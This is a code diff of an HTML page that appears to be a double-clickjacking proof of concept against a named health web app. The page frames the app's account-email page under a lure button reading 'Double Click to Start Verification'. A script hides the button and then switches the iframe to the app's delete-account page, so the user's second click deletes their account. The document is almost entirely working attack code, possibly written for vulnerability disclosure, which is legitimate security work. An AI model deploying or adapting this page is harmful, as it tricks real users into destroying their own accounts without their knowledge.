@@ -1,20 +1,80 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <style>
         * {
-            width: 100%;
-            height: 100%;
-            box-sizing: border-box;
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body,
+        html,
+        iframe {
+            width: 100%;
+            height: 100%;
+        }
+
+        #olivia {
+            width: 100%;
+            position: absolute;
+            z-index: 1;
+            opacity: 0.5;
+        }
+
+        #doubleClickButton {
+            z-index: 2;
+            position: absolute;
+            top: 40px;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            height: 70px;
+            width: 70px;
+            border-radius: 50%;
+        }
+
+        #deleteButtonStep1 {
+            z-index: 2;
+            position: absolute;
+            top: 70px;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            margin: auto;
+            height: 70px;
+            width: 270px;
+            display: none;
         }
     </style>
 </head>
+
 <body>
-    <iframe src="https://app.oliviahealth.ai/account/email" width="100%" height="100%"></iframe>
+    <iframe id="oliviaIframe" src="https://app.oliviahealth.ai/account/email"></iframe>
+    <button id="doubleClickButton" onclick="rotateButton('doubleClickButton')">Double Click to Start
+        Verification</button>
 </body>
+<script>
+    const doubleClickButton = document.getElementById("doubleClickButton");
+    const iframe = document.getElementById("oliviaIframe")
+
+    const rotateButton = step => {
+        if (step === "doubleClickButton") {
+            doubleClickButton.style = "display: none"
+
+            // Reloads the iframe
+            setTimeout(function () {
+                iframe.src = "https://app.oliviahealth.ai/account/delete-account"
+            }, 1000);
+        }
+
+        return
+    }
+</script>
+
 </html>
